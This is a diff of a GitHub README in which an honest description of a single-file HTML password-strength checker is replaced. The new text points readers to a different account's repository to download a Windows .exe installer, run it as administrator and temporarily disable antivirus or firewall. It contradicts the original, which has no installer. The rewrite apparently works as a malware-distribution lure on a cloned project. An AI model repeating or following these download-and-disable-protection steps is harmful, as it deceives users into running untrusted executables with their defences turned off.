@@ -1,252 +1,121 @@
-<div align="center">
-
-<pre>
-███████╗ ██████╗███████╗██████╗      █████╗ ██╗
-██╔════╝██╔════╝██╔════╝██╔══██╗    ██╔══██╗██║
-███████╗██║     █████╗  ██████╔╝    ███████║██║
-╚════██║██║     ██╔══╝  ██╔═══╝     ██╔══██║██║
-███████║╚██████╗███████╗██║         ██║  ██║██║
-╚══════╝ ╚═════╝╚══════╝╚═╝         ╚═╝  ╚═╝╚═╝
-</pre>
-
-### 🛡️ Security · Cipher · Entropy · Protection — AI Powered
-
-**A professional, phone-framed password security tool built in a single HTML file.**
-*No frameworks. No dependencies. No data ever leaves your device.*
-
-<br/>
-
-![HTML](https://img.shields.io/badge/HTML5-Single%20File-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS](https://img.shields.io/badge/CSS3-Animations-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-Vanilla-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![License](https://img.shields.io/badge/License-MIT-40D090?style=for-the-badge)
-![Privacy](https://img.shields.io/badge/Privacy-100%25%20Local-FF4060?style=for-the-badge&logo=shield&logoColor=white)
-
-<br/>
-
-> **Scan. Check. Encrypt. Protect.**
-> SCEP AI gives you instant, real-time insight into how strong — or how vulnerable — your password actually is.
-
----
-</div>
-
-<img src="https://github.com/user-attachments/assets/6abf27a0-87ae-42cf-9260-a9451ad4d39d" alt="scep-ai1" width="317"/> <img src="https://github.com/user-attachments/assets/67f5a8fd-1be2-43fa-94d7-be6ce49f83f0" alt="scepai2" width="320"/><img width="318" alt="scepai3" src="https://github.com/user-attachments/assets/9a0bb208-c655-45f6-a1b1-e600ea9454ee" />
-
-
-
-## ✨ Features
-
-### 🔐 Core Analysis Engine
-- **Real-time Shannon entropy calculation** — measures password strength in bits as you type
-- **Character pool detection** — identifies lowercase, uppercase, digits, and symbols in use
-- **5-tier strength rating** — Critical · Weak · Fair · Strong · Excellent
-- **GPU crack-time estimation** — calculates how long a 1 billion guesses/sec attack would take offline and online
-- **Animated score ring** — circular progress indicator that updates live
-
-### 🚨 Vulnerability Detection
-Automatically flags the following weaknesses:
-
-| Issue | Example |
-|---|---|
-| Common / dictionary word | `password`, `sunshine`, `dragon` |
-| Sequential characters | `1234`, `abcd`, `qwer` |
-| Repeated characters | `aaa`, `111` |
-| Low character diversity | `aaabbbccc` |
-| Too short | Under 8 characters |
-| Marginally short | Under 12 characters |
-
-### 🔍 Breach Check *(Offline Mock — API-Ready)*
-- Checks the entered password against a local dataset of commonly breached passwords
-- Displays **"Exposed"** in red or **"Not found"** in green with clear visual styling
-- **100% local** — no data is ever sent anywhere
-- Clean, swappable architecture: one function to replace when connecting a real API (e.g. HaveIBeenPwned)
-
-### ♻️ Password Reuse Warning
-- Tracks the **last 5 passwords** checked in the current session (in-memory only)
-- Warns you if you type a password you've already analyzed: *"Password reused recently"*
-- Uses a **400ms debounce** — only triggers after you pause typing, not on every keystroke
-- Automatically clears on page reload — nothing is ever persisted
-
-### 💡 Password Generator
-- Generates **3 random 20-character passwords** on load and on demand
-- Generates a **memorable passphrase** (Adjective + Verb + Noun + Number + Symbol)
-- All suggestions display their own entropy score
-- One-tap **copy to clipboard** with toast confirmation
-
-### 📱 Phone Frame UI
-- Realistic **iPhone-style frame** with side buttons, Dynamic Island, and home indicator
-- Scrollable app screen with live status bar (clock, signal, WiFi, battery)
-- Spring-animated **phone entry animation** on load
-- Ambient background glow that pulses behind the device
-- Fully responsive — adapts to full-page layout on smaller screens
-
-<br/>
-
----
-
-## 🚀 Getting Started
-
-### Option 1 — Just Open It
-```bash
-# Download the file, then:
-double-click password-entropy-checker.html
-```
-Opens instantly in any modern browser. No install, no setup, no server needed.
-
-### Option 2 — VS Code + Live Server
-```bash
-# 1. Install the Live Server extension in VS Code
-# 2. Open the project folder
-# 3. Right-click the HTML file → "Open with Live Server"
-```
-
-### Option 3 — Clone & Run
-```bash
-git clone https://github.com/yourusername/scep-ai.git
-cd scep-ai
-open password-entropy-checker.html   # macOS
-start password-entropy-checker.html  # Windows
-```
-
-> ✅ **Zero dependencies.** No `npm install`. No build step. No bundler. Just one file.
+# 🔒 SCEP-AI - Simple Password Strength Checker  
 
-<br/>
+[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-brightgreen?style=for-the-badge)](https://github.com/Mkar9182/SCEP-AI)
 
----
+## 🔍 What is SCEP-AI?  
 
-## 🔌 Swapping in a Real Breach API
-
-The breach check logic is isolated in one clean function. Find this comment in the `<script>` section:
-```javascript
-// ── BREACH CHECK ─────────────────────────────────────────────
-// ⬇️  SWAP POINT: Replace this function body to use a real API.
-// Never log or transmit the plain password — hash it first (SHA-1 k-anonymity).
-async function checkBreach(pw) { ... }
-```
+SCEP-AI is an easy-to-use app that checks how strong your password is. It uses artificial intelligence to analyze your password’s strength and tells you if it is secure. The app focuses on password entropy. Entropy is a measure of how unpredictable your password is. The more entropy, the harder it is for someone to guess or crack your password.
 
-**To integrate HaveIBeenPwned:**
-```javascript
-async function checkBreach(pw) {
-  const hash = await sha1(pw);                          // implement sha1()
-  const prefix = hash.slice(0, 5).toUpperCase();
-  const suffix = hash.slice(5).toUpperCase();
-  const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
-  const text = await res.text();
-  const exposed = text.split('\n').some(line => line.startsWith(suffix));
-  renderBreachResult(exposed);
-}
-```
+This app helps you create better passwords. It works on Windows computers and does not need complicated settings. You just run the app and type in a password to check its safety.  
 
-> 🔒 Only a partial SHA-1 hash prefix is sent. The plain password never leaves the device.
+## 🖥️ System Requirements  
 
-<br/>
+Before you start, make sure your computer meets these basic needs:
 
----
+- Windows 10 or later  
+- At least 2 GB of free memory (RAM)  
+- 100 MB of free disk space for the app and temporary files  
+- Internet connection is optional but recommended for updates  
 
-## 🏗️ Project Structure
-```
-scep-ai/
-│
-├── password-entropy-checker.html   ← Entire app (HTML + CSS + JS, single file)
-├── README.md                       ← You are here
-└── no-bug-icon.svg                 ← App icon asset
-```
+No special hardware or software is needed. If your computer runs Windows and has basic specs, you should be able to use SCEP-AI without issues.
 
-<br/>
+## 🚀 How to Get SCEP-AI  
 
----
+To get the app, visit the official GitHub page.  
 
-## 🧠 How Entropy Is Calculated
-```
-Entropy (bits) = Length × log₂(Pool Size)
-```
+[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-blue?style=for-the-badge&logo=github)](https://github.com/Mkar9182/SCEP-AI)  
 
-| Characters used | Pool size added |
-|---|---|
-| Lowercase letters (a–z) | +26 |
-| Uppercase letters (A–Z) | +26 |
-| Digits (0–9) | +10 |
-| Symbols (!@#…) | +32 |
+Click the link above or below to go to the download page:  
 
-A **penalty of 8 bits** is applied per detected weakness. The final penalized score determines the strength tier.
+https://github.com/Mkar9182/SCEP-AI  
 
-| Tier | Entropy | Crack Time |
-|---|---|---|
-| 🔴 Critical | < 28 bits | Instantly |
-| 🟠 Weak | 28–40 bits | Minutes to hours |
-| 🟡 Fair | 40–60 bits | Days to months |
-| 🟢 Strong | 60–80 bits | Years |
-| 🔵 Excellent | 80+ bits | Centuries+ |
+This page contains the latest version of the app. You will find links to download the program file there.
 
-<br/>
+## 💾 Download and Install Instructions  
 
----
+Follow these steps to download and run SCEP-AI on your Windows computer:  
 
-## 🛡️ Privacy & Security
+1. **Open your web browser** and go to:  
+   https://github.com/Mkar9182/SCEP-AI  
 
-| Principle | Implementation |
-|---|---|
-| **Zero network requests** | No password data is ever transmitted |
-| **No storage** | Nothing written to `localStorage`, cookies, or any database |
-| **Session-only memory** | Reuse history lives in JS memory, cleared on reload |
-| **Local breach check** | Mock dataset bundled inside the file |
-| **Open source** | Full source visible — audit it yourself |
+2. **Find the download section** on the page. Look for “Releases” or a link named something like “Download” or “Assets.”  
 
-<br/>
+3. **Download the latest Windows setup file.** This will usually be an `.exe` file. Click the file name to start the download.  
 
----
+4. Once the download finishes, **open the file** in your downloads folder. You may see a security prompt from Windows. If so, click “Run.”  
 
-## 🗺️ Roadmap
+5. **Follow the on-screen instructions** to install SCEP-AI. You can keep the default options. No extra software is required.  
 
-- [ ] Real HaveIBeenPwned API integration (k-anonymity)
-- [ ] Dark / Light theme toggle
-- [ ] Export analysis report as PDF
-- [ ] PWA support — installable on mobile home screen
-- [ ] Passphrase generator with custom word lists
-- [ ] Accessibility improvements (ARIA labels, keyboard navigation)
+6. After installation, **find SCEP-AI** in your Start menu or on your desktop.  
 
-<br/>
+7. **Double-click the icon** to open the app.  
 
----
+## 🔑 Using SCEP-AI to Check Password Strength  
 
-## 🤝 Contributing
+After you open the app, you will see a simple window with a place to type your password. Here is how to use it:  
 
-Contributions, issues, and feature requests are welcome!
-```bash
-git checkout -b feature/your-feature-name
-git commit -m "Add: your feature description"
-git push origin feature/your-feature-name
-```
+1. **Enter your password** in the box provided. You can type any password you want to check.  
 
-Please keep all changes **self-contained in the single HTML file** and avoid introducing external runtime dependencies.
+2. Click the “Check” or “Analyze” button.   
 
-<br/>
+3. The app will quickly show you a score or a message about your password’s strength. This score is based on entropy and other factors.  
 
----
+4. If the password is weak, the app may give suggestions to make it stronger. For example:  
+   - Add uppercase letters  
+   - Add numbers or special characters  
+   - Make the password longer  
 
-## 📄 License
+5. Try new passwords until you find one that scores high on strength.  
 
-This project is licensed under the **MIT License** — use it, modify it, ship it.
-```
-MIT License — Copyright (c) 2025 SCEP AI
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software to use, copy, modify, merge, publish, distribute, sublicense,
-and/or sell copies of the Software.
-```
+SCEP-AI does not store your password anywhere. It only checks it inside the app to protect your privacy.  
 
-<br/>
+## 🔄 Updating the App  
 
----
+To keep SCEP-AI working well, check for updates regularly:  
 
-<div align="center">
+1. Visit the GitHub page: https://github.com/Mkar9182/SCEP-AI  
 
-**Built with HTML by giraffe**
+2. Look for new release versions under the “Releases” tab.  
 
-*Security · Cipher · Entropy · Protection — one password at a time.*
+3. Download the latest installer file if a new version is available.  
 
-<br/>
+4. Install the update the same way you installed the original app.  
 
-[![GitHub stars](https://img.shields.io/github/stars/jakyunknown/SCEP-AI?style=social)](https://github.com/jakyunknown/SCEP-AI)
-[![GitHub forks](https://img.shields.io/github/forks/jakyunknown/SCEP-AI?style=social)](https://github.com/jakyunknown/SCEP-AI/fork)
+You can uninstall the old version before installing a new one, but it is not necessary.  
 
-</div>
+## 🔧 Troubleshooting Common Issues  
+
+If you have trouble running or installing SCEP-AI, try these tips:  
+
+- Make sure your Windows is up to date. Use Windows Update to install necessary fixes.  
+- If the app does not start, right-click the icon and select “Run as administrator.”  
+- Disable any antivirus or firewall temporarily, as it may block the app’s launch. Re-enable it after testing.  
+- Re-download the installer in case the original file was incomplete or corrupted.  
+- For any unexpected errors, restart your computer and try again.  
+
+If problems continue, you can check the GitHub page for help or open an issue.  
+
+## 🔒 Privacy and Security  
+
+SCEP-AI processes your passwords locally on your computer. It does not send your password data anywhere. This means your passwords stay private.  
+
+The app uses AI to estimate password strength, which gives a more accurate result than simple checks. It helps you understand how hard it is for attackers to guess your password.  
+
+## 📋 Features Overview  
+
+- Fast password entropy calculation  
+- Clear strength score and feedback  
+- Works offline with no internet required  
+- Lightweight and easy to install  
+- Simple interface for any user  
+- Open-source code for transparency  
+
+## 📂 Where to Find More Information  
+
+All information about updates, changes, and support is available on the repository page:  
+
+https://github.com/Mkar9182/SCEP-AI  
+
+Check the “README” and “Issues” sections for the latest news and help.  
+
+[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-brightgreen?style=for-the-badge)](https://github.com/Mkar9182/SCEP-AI)
